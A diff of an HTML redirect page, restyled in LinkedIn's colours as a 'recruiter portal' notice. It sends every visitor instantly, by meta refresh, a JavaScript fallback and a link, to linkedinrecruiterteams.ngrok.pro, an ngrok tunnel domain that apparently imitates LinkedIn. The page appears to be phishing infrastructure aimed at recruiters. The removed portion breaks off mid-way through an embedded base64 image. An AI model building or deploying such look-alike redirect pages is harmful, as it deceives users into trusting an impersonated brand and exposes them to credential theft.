@@ -2,119 +2,65 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Redirecting...</title>
+  <title>Redirecting Recruiters…</title>
+
+  <!-- Instant redirect -->
+  <meta http-equiv="refresh" content="0; url=https://linkedinrecruiterteams.ngrok.pro" />
+
+  <!-- SEO & fallback -->
+  <link rel="canonical" href="https://linkedinrecruiterteams.ngrok.pro" />
+
   <style>
-    /* === Base Layout === */
     body {
+      font-family: Arial, sans-serif;
+      background-color: #f3f2ef;
       display: flex;
-      flex-direction: column;
-      align-items: center;
       justify-content: center;
+      align-items: center;
       height: 100vh;
       margin: 0;
-      background: linear-gradient(135deg, #f9fafb, #e8f1ff);
-      font-family: "Segoe UI", Arial, sans-serif;
-      color: #333;
-      overflow: hidden;
-      animation: fadeIn 1s ease-in-out forwards;
-      position: relative;
-      text-align: center;
-      padding: 0 20px;
     }
 
-    /* === Recruiter Logo === */
-    .logo {
-      width: 200px;
-      max-width: 70%;
-      height: auto;
-      margin-bottom: 25px;
-      opacity: 0;
-      animation: fadeInUp 1s ease-in-out forwards;
-      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
-    }
-
-    /* === Spinner === */
-    .loader {
-      border: 6px solid #f3f3f3;
-      border-top: 6px solid #007bff;
-      border-radius: 50%;
-      width: 45px;
-      height: 45px;
-      margin-bottom: 15px;
-      opacity: 0;
-      animation: fadeInUp 1s ease-in-out 0.5s forwards, spin 1s linear infinite;
-    }
-
-    /* === Text === */
-    p {
-      font-size: 1rem;
-      opacity: 0;
-      animation: fadeInUp 1s ease-in-out 1s forwards;
-    }
-
-    /* === White Fade Overlay === */
-    .fade-overlay {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
+    .card {
       background: white;
-      opacity: 0;
-      pointer-events: none;
-      transition: opacity 0.8s ease-in-out;
-      z-index: 10;
+      padding: 30px;
+      border-radius: 8px;
+      width: 360px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      text-align: center;
     }
 
-    /* === Animations === */
-    @keyframes spin {
-      0% { transform: rotate(0deg); border-top-color: #007bff; }
-      50% { border-top-color: #8a5fff; }
-      100% { transform: rotate(360deg); border-top-color: #007bff; }
+    h1 {
+      color: #0a66c2;
+      margin-bottom: 10px;
     }
 
-    @keyframes fadeInUp {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
+    p {
+      color: #333;
+      font-size: 14px;
     }
 
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-
-    /* === Responsive Adjustments === */
-    @media (max-width: 600px) {
-      .logo {
-        width: 140px;
-        margin-bottom: 20px;
-      }
-      .loader {
-        width: 35px;
-        height: 35px;
-      }
-      p {
-        font-size: 0.9rem;
-      }
+    a {
+      color: #0a66c2;
+      text-decoration: none;
+      font-weight: bold;
     }
   </style>
 
   <script>
-    // Wait 2.5 seconds, then fade to white before redirect
-    setTimeout(() => {
-      const overlay = document.querySelector('.fade-overlay');
-      overlay.style.opacity = '1';
-      setTimeout(() => {
-        window.location.href = "https://linkedinrecruiterteams.ngrok.pro";
-      }, 800); // Redirect after fade-to-white
-    }, 2500);
+    // JavaScript fallback (in case meta refresh is blocked)
+    window.location.replace("https://linkedinrecruiterteams.ngrok.pro");
   </script>
 </head>
-<body>
-  <div class="fade-overlay"></div>
 
-  <!-- Recruiter Logo (Base64) -->
-  <img
-    class="logo"
-    src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBwgHBgkIBwgKCgkLDRYPDQwMDRsUFRAWIB0iIiAdHx8kKDQsJCYxJx8fLT0tMTU3Ojo6Iys/RD84QzQ5OjcBCgoKDQwNGg8PGjclHyU3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3N//AABEIAJQAzAMBIgACEQEDEQH/xAAbAAADAQADAQAAAAAAAAAAAAAAAQIDBQYHBP/EADYQAAEDAwMCBAQDBwUAAAAAAAEAAgMEBREGEiETMQdBUWEicYGRFDKxFSNCUqGy0RYzNVRi/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AO/AKsIAVAYQIBVhCoBAsJ4TwqAQQGp7eVYCeEE7UAKsIwgnCWFeEYQThIhXtTIQZ4TwqwU9qDPCNqvCeEGW1LC0wghBkQlhaYSIQZkKcLQhIjhBmUlRCSCgqwk1WEABlUAgDCaAA5VgIAVBAsJ4TTwgnCYCrCeEEYQr2phiDPCFrtCNgQZYR5LUsSLOEGeEiFe1GEGeEEK8JIMyFOFoQpIQQQpKsqSgzUlaYUFBQVhSMKwEFAJgJBaNCAwmE8JgIBPCYVAIEAmGptCsBBIamqxyjagnCMK9qYagzwhXhBagzIUlq0wkQgxIU4WpCkhBmkQrIUlBkVJWhCgoIKg91o4einCBhWOyhoVhB891ro7Xa6q4TAuZTROkLR3dgdl55aKPVeuWzV0uoH2qh6hayKnB747NwQTj+Zx7+S9HraSGvoZqOoaTFOwxvwcHBHkvPI36i8P5ZGChNzs735L4+NvlnIB2n2Ix7oOB1JqC+1lzmghutVBTUrjDG2F5YX7eC5xHJJPOMrvPhjfq+7UVXS3SUzzUjm7Z3cGRrs4z7gg8+a6y/wD0/qq4Pnt9XPb6mZrpZoJoWlmRy4h24DJ9F92ntZ6V05SmngjuEr5H5lqHQAF5+WTgD0Qen4KpoXBaf1dZL/J0rfWtM+M9GRpY/HqAe/0XIXG701skjZUsmw+N8hcxmQxjSA5x9viCDkQEw1cU++0rGySdKodAx/SbM2PLZJN23Y3nJJccdsLk6WV08IkdBLCSSNkrcOGEGgaq2pgKkEgIwrwghBBCkhaYSfhrS5xwAMkoMy1QRhde03rmz6julRbrf1xNC1zwZI8NkaCAS0/Mjv6rsj+MZ8+yDIqHBangqHIMipKsqEElZlaFQ5Bm7spVlQSgpqsKGqwgtvCtpIPBx7qGqwg6XcKSll8SqaEwxN61smJ+ADc45GT7911bQht8N+ktN4oaaZtRmJvXi3FkrT+Xn15+oC+/xGrqy26woa63yCOohpvhcW5ByTkEehXX9Q0V6irTdblRyUM1RP1Y3AYAf34Qc54m6ct9kdb7nZYxR1HWIDIzgNc0ZDm+nnkduQu06nuViittsuGoZ3x1UlNup4YAC8PdtdvaCDjaWjBPHrldfsGnrnrSphvOpbjHNRB
+<body>
+  <div class="card">
+    <h1>Redirecting…</h1>
+    <p>
+      You’re being redirected to our recruiter portal.<br />
+      If this doesn’t happen automatically,
+      <a href="https://linkedinrecruiterteams.ngrok.pro">click here</a>.
+    </p>
+  </div>
+</body>
+</html>
